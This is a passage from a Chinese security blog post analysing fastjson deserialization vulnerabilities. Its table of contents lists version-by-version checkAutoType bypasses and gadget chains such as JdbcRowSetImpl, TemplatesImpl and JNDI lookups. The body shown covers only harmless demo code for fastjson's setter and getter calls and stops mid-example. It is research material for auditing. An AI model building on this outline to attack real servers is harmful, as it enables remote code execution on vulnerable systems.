<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>fastjson分析 - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="fastjson分析" />
<meta property="og:description" content="fastjson分析" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mi3aka.eu.org/fastjson/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-10T14:08:30+00:00" />
<meta property="article:modified_time" content="2022-11-10T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>

<meta name="twitter:title" content="fastjson分析"/>
<meta name="twitter:description" content="fastjson分析"/>
<meta name="application-name" content="Mi3aka&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/fastjson/" /><link rel="prev" href="https://mi3aka.eu.org/ysoserial/" /><link rel="next" href="https://mi3aka.eu.org/log4j2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "fastjson分析",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/mi3aka.eu.org\/fastjson\/"
        },"genre": "posts","wordcount":  12463 ,
        "url": "https:\/\/mi3aka.eu.org\/fastjson\/","datePublished": "2022-11-10T14:08:30+00:00","dateModified": "2022-11-10T14:08:30+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Mi3aka"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">fastjson分析</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author">
                    <a href="/" title="Author" rel="author" class="author">Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>代码审计</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-11-10">2022-11-10</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 12463 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 25 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#基本使用">基本使用</a>
      <ul>
        <li><a href="#getproperties被调用的原因">getProperties被调用的原因</a></li>
        <li><a href="#parseobjectjson调用所有setter和getter的原因">parseObject(json)调用所有setter和getter的原因</a></li>
      </ul>
    </li>
    <li><a href="#调用恶意类">调用恶意类</a></li>
    <li><a href="#1224">1.2.24</a>
      <ul>
        <li><a href="#黑名单处理方法">黑名单处理方法</a></li>
        <li><a href="#jdbcrowsetimpl分析">JdbcRowSetImpl分析</a></li>
        <li><a href="#templatesimpl分析">TemplatesImpl分析</a></li>
      </ul>
    </li>
    <li><a href="#1225-41">1.2.25-41</a>
      <ul>
        <li><a href="#checkautotype分析">checkAutoType分析</a></li>
      </ul>
    </li>
    <li><a href="#1242">1.2.42</a>
      <ul>
        <li><a href="#checkautotype分析-1">checkAutoType分析</a></li>
      </ul>
    </li>
    <li><a href="#1243">1.2.43</a>
      <ul>
        <li><a href="#checkautotype分析-2">checkAutoType分析</a></li>
      </ul>
    </li>
    <li><a href="#1245">1.2.45</a>
      <ul>
        <li><a href="#checkautotype分析-3">checkAutoType分析</a></li>
        <li><a href="#mybatis分析">mybatis分析</a></li>
      </ul>
    </li>
    <li><a href="#1247">1.2.47</a>
      <ul>
        <li><a href="#未开启autotypesupport">未开启AutoTypeSupport</a></li>
        <li><a href="#开启autotypesupport">开启AutoTypeSupport</a></li>
      </ul>
    </li>
    <li><a href="#1262">1.2.62</a>
      <ul>
        <li><a href="#checkautotype分析-4">checkAutoType分析</a></li>
        <li><a href="#jndiconverter分析">JndiConverter分析</a></li>
      </ul>
    </li>
    <li><a href="#1266">1.2.66</a>
      <ul>
        <li><a href="#jndirealmfactory分析">JndiRealmFactory分析</a></li>
        <li><a href="#anterosdbcpconfig分析">AnterosDBCPConfig分析</a></li>
        <li><a href="#jtatransactionconfig分析">JtaTransactionConfig分析</a></li>
      </ul>
    </li>
    <li><a href="#1267">1.2.67</a>
      <ul>
        <li><a href="#cachejnditmlookup分析">CacheJndiTmLookup分析</a></li>
        <li><a href="#jndiobjectfactory分析">JndiObjectFactory分析</a></li>
      </ul>
    </li>
    <li><a href="#1268">1.2.68</a>
      <ul>
        <li><a href="#第一次checkautotype分析">第一次checkAutoType分析</a></li>
        <li><a href="#javabeandeserializer反序列化器">JavaBeanDeserializer反序列化器</a></li>
        <li><a href="#第二次checkautotype分析">第二次checkAutoType分析</a></li>
      </ul>
    </li>
    <li><a href="#1280">1.2.80</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><blockquote>
<p>参考文章</p>
</blockquote>
<p><a href="https://tttang.com/archive/1579/" target="_blank" rel="noopener noreffer ">Fastjson 反序列化分析</a></p>
<p><a href="https://www.anquanke.com/post/id/232774" target="_blank" rel="noopener noreffer ">浅析Fastjson1.2.62-1.2.68反序列化漏洞</a></p>
<h2 id="基本使用">基本使用</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependencies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;groupId&gt;</span>com.unboundid<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;artifactId&gt;</span>unboundid-ldapsdk<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;version&gt;</span>3.1.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependencies&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>User类</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Properties</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Properties</span> <span class="n">properties</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Integer</span> <span class="n">age</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">User</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">properties</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Properties</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;User Construct&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;getName&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">name</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;setName&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Integer</span> <span class="nf">getAge</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;getAge&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">age</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setAge</span><span class="o">(</span><span class="n">Integer</span> <span class="n">age</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;setAge&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Properties</span> <span class="nf">getProperties</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;getProperties&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">properties</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;toString&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;User{&#34;</span> <span class="o">+</span> <span class="s">&#34;name=&#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sc">&#39;\&#39;&#39;</span> <span class="o">+</span> <span class="s">&#34;, age=&#34;</span> <span class="o">+</span> <span class="n">age</span> <span class="o">+</span> <span class="s">&#34;, properties=&#34;</span> <span class="o">+</span> <span class="n">properties</span> <span class="o">+</span> <span class="sc">&#39;}&#39;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>不指定<code>@type</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Parse</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">User</span> <span class="n">user1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">user1</span><span class="o">.</span><span class="na">setAge</span><span class="o">(</span><span class="mi">13</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">user1</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&#34;张三&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* fastjson将类转换为json字符串,在转换的同时调用了get方法 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">json1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* fastjson将字符串转换为类会自动调用construct方法和set方法 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">parse1</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">json1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse1 &#34;</span> <span class="o">+</span> <span class="n">parse1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parse1</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">// class com.alibaba.fastjson.JSONObject
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">parse2</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse2 &#34;</span> <span class="o">+</span> <span class="n">parse2</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parse2</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">// class com.alibaba.fastjson.JSONObject
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">User</span> <span class="n">parse3</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json1</span><span class="o">,</span> <span class="n">User</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;parse3 &#34;</span> <span class="o">+</span> <span class="n">parse3</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">parse3</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span><span class="c1">// class learn.User
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/4a97b50c2586ced192d75f4963ccc6df.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/4a97b50c2586ced192d75f4963ccc6df.png, https://img.mi3aka.eu.org/2023/02/4a97b50c2586ced192d75f4963ccc6df.png 1.5x, https://img.mi3aka.eu.org/2023/02/4a97b50c2586ced192d75f4963ccc6df.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/4a97b50c2586ced192d75f4963ccc6df.png"
        title="https://img.mi3aka.eu.org/2023/02/4a97b50c2586ced192d75f4963ccc6df.png" /></p>
<ol start="2">
<li>指定<code>@type</code></li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.serializer.SerializerFeature</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ParseWithType</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">User</span> <span class="n">user1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">User</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">user1</span><span class="o">.</span><span class="na">setAge</span><span class="o">(</span><span class="mi">13</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">user1</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">&#34;张三&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">user1</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;---&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* 输出带有一个@type参数,值为learn.User类 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">json2</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">toJSONString</span><span class="o">(</span><span class="n">user1</span><span class="o">,</span> <span class="n">SerializerFeature</span><span class="o">.</span><span class="na">WriteClassName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">json2</span><span class="o">);</span>
